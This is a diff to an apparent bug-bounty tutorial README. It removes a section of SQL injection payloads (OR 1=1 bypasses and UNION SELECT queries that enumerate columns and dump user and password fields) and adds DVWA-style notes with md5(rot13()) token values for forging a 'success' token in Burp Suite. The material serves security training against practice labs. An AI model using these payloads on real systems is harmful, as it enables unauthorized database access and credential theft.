@@ -1,13 +1,14 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
-```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
+## 20.javascript
 
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
-
-1' OR 1=1 UNION SELECT user, password FROM users #
+### low
 ```
+md5(rot13("ChangeMe"))
+'8b479aefbd90795395b3e7089ae0dc09'
+md5(rot13("success"))
+'38581812b435834ebf84ebcc2c6424d6'
+```
+
+## burp suite change token for success
